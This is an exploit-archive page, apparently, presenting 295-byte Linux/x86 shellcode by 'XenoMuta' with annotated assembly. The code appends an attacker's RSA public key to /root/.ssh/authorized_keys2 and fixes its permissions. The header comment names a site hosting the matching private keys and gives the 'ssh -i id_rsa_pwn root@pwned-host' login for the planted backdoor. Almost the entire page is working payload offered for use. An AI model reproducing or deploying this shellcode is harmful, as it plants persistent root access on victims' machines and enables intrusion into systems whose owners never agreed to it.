<html><head><title>Linux/x86 - append rsa key to /root/.ssh/authorized_keys2 - 295 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 linux/x86 shellcode to append rsa key to /root/.ssh/authorized_keys2
 keys found at http://xenomuta.tuxfamily.org/exploits/authkey/ 
 ssh -i id_rsa_pwn root@pwned-host

 295 bytes
 by XenoMuta
     _  __                 __  ___      __       
    | |/ /__  ____  ____  /  |/  /_  __/ /_____ _
    |   / _ \/ __ \/ __ \/ /|_/ / / / / __/ __ `/
   /   /  __/ / / / /_/ / /  / / /_/ / /_/ /_/ / 
  /_/|_\___/_/ /_/\____/_/  /_/\__,_/\__/\__,_/  

   xenomuta [ arroba ] phreaker [ punto ] net

  http://xenomuta.tuxfamily.org/ - Methylxantina 256mg
  
 - God bless you all -

*/
unsigned char sc[] =
//&lt;_start&gt;:
&quot;\x31\xd2&quot;	 // xor    %edx,%edx
&quot;\x52&quot;		 // push   %edx
&quot;\x68\x65\x79\x73\x32&quot;	 // push   $0x32737965 ; /root/.ssh/authorized_keys2
&quot;\x68\x65\x64\x5f\x6b&quot;	 // push   $0x6b5f6465
&quot;\x68\x6f\x72\x69\x7a&quot;	 // push   $0x7a69726f
&quot;\x68\x61\x75\x74\x68&quot;	 // push   $0x68747561
&quot;\x68\x73\x73\x68\x2f&quot;	 // push   $0x2f687373
&quot;\x68\x74\x2f\x2f\x2e&quot;	 // push   $0x2e2f2f74
&quot;\x68\x2f\x72\x6f\x6f&quot;	 // push   $0x6f6f722f
&quot;\x89\xe3&quot;	 // mov    %esp,%ebx
&quot;\x66\xb9\x41\x04&quot;	 // mov    $0x441,%cx ; O_CREAT | O_APPEND | O_WRONLY
//&lt;_open&gt;:
&quot;\x6a\x05&quot;	 // push   $0x5 ; sys_open()
&quot;\x58&quot;		 // pop    %eax
&quot;\xcd\x80&quot;	 // int    $0x80
//&lt;_write&gt;:
&quot;\x93&quot;		 // xchg   %eax,%ebx
&quot;\x89\xe6&quot;	 // mov    %esp,%esi
&quot;\x31\xd2&quot;	 // xor    %edx,%edx
&quot;\x52&quot;		 // push   %edx
&quot;\x6a\x0a&quot;	 // push   $0xa
&quot;\x68\x20\x78\x78\x78&quot;	 // push   $0x78787820 ; contenido de id_rsa_pwn.pub
&quot;\x68\x31\x35\x54\x4a&quot;	 // push   $0x4a543531
&quot;\x68\x56\x39\x48\x57&quot;	 // push   $0x57483956
&quot;\x68\x6d\x75\x2b\x38&quot;	 // push   $0x382b756d
&quot;\x68\x31\x35\x64\x31&quot;	 // push   $0x31643531
&quot;\x68\x64\x2f\x71\x69&quot;	 // push   $0x69712f64
&quot;\x68\x52\x4b\x61\x79&quot;	 // push   $0x79614b52
&quot;\x68\x70\x70\x79\x6e&quot;	 // push   $0x6e797070
&quot;\x68\x35\x46\x31\x6d&quot;	 // push   $0x6d314635
&quot;\x68\x55\x64\x5a\x35&quot;	 // push   $0x355a6455
&quot;\x68\x4d\x2b\x4c\x63&quot;	 // push   $0x634c2b4d
&quot;\x68\x38\x59\x41\x6d&quot;	 // push   $0x6d415938
&quot;\x68\x4d\x42\x50\x79&quot;	 // push   $0x7950424d
&quot;\x68\x4c\x44\x4d\x58&quot;	 // push   $0x584d444c
&quot;\x68\x41\x34\x31\x38&quot;	 // push   $0x38313441
&quot;\x68\x65\x33\x76\x4d&quot;	 // push   $0x4d763365
&quot;\x68\x48\x6f\x78\x77&quot;	 // push   $0x77786f48
&quot;\x68\x34\x6d\x46\x36&quot;	 // push   $0x36466d34
&quot;\x68\x48\x39\x6f\x39&quot;	 // push   $0x396f3948
&quot;\x68\x56\x59\x48\x6a&quot;	 // push   $0x6a485956
&quot;\x68\x4b\x41\x74\x6d&quot;	 // push   $0x6d74414b
&quot;\x68\x70\x7a\x64\x71&quot;	 // push   $0x71647a70
&quot;\x68\x50\x2b\x76\x4d&quot;	 // push   $0x4d762b50
&quot;\x68\x6c\x47\x51\x43&quot;	 // push   $0x4351476c
&quot;\x68\x50\x68\x4f\x32&quot;	 // push   $0x324f6850
&quot;\x68\x4d\x37\x48\x35&quot;	 // push   $0x3548374d
&quot;\x68\x76\x6b\x6c\x47&quot;	 // push   $0x476c6b76
&quot;\x68\x37\x74\x4f\x35&quot;	 // push   $0x354f7437
&quot;\x68\x54\x63\x6e\x77&quot;	 // push   $0x776e6354
&quot;\x68\x36\x63\x77\x65&quot;	 // push   $0x65776336
&quot;\x68\x6d\x62\x64\x71&quot;	 // push   $0x7164626d
&quot;\x68\x4e\x32\x75\x70&quot;	 // push   $0x7075324e
&quot;\x68\x74\x73\x6a\x58&quot;	 // push   $0x586a7374
&quot;\x68\x41\x47\x45\x41&quot;	 // push   $0x41454741
&quot;\x68\x49\x77\x41\x41&quot;	 // push   $0x41417749
&quot;\x68\x41\x41\x41\x42&quot;	 // push   $0x42414141
&quot;\x68\x63\x32\x45\x41&quot;	 // push   $0x41453263
&quot;\x68\x61\x43\x31\x79&quot;	 // push   $0x79314361
&quot;\x68\x42\x33\x4e\x7a&quot;	 // push   $0x7a4e3342
&quot;\x68\x41\x41\x41\x41&quot;	 // push   $0x41414141
&quot;\x68\x72\x73\x61\x20&quot;	 // push   $0x20617372
&quot;\x68\x73\x73\x68\x2d&quot;	 // push   $0x2d687373
&quot;\x89\xe1&quot;	 // mov    %esp,%ecx
&quot;\xb2\xa9&quot;	 // mov    $0xa9,%dl
&quot;\x6a\x04&quot;	 // push   $0x4   ; sys_write()
&quot;\x58&quot;		 // pop    %eax
&quot;\xcd\x80&quot;	 // int    $0x80
&quot;\x34\xaf&quot;	 // xor    $0xaf,%al ; 0xa9 xor 0xaf = 0x6 ( sys_close() )
&quot;\xcd\x80&quot;	 // int    $0x80
&quot;\x04\x0f&quot;	 // add    $0xf,%al  ; sys_chmod()
&quot;\x89\xf3&quot;	 // mov    %esi,%ebx
&quot;\x66\xb9\x80\x01&quot;	 // mov    $0x180,%cx ; 0600  para que ssh no se queje
&quot;\xcd\x80&quot;	 // int    $0x80
&quot;\x6a\x01&quot;	 // push   $0x1      ; adios exit
&quot;\x58&quot;		 // pop    %eax
&quot;\xcd\x80&quot;;	 // int    $0x80

main(){printf(&quot;%d bytes\n&quot;, strlen(sc));}
//main(){(*(void (*)()) sc)();}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
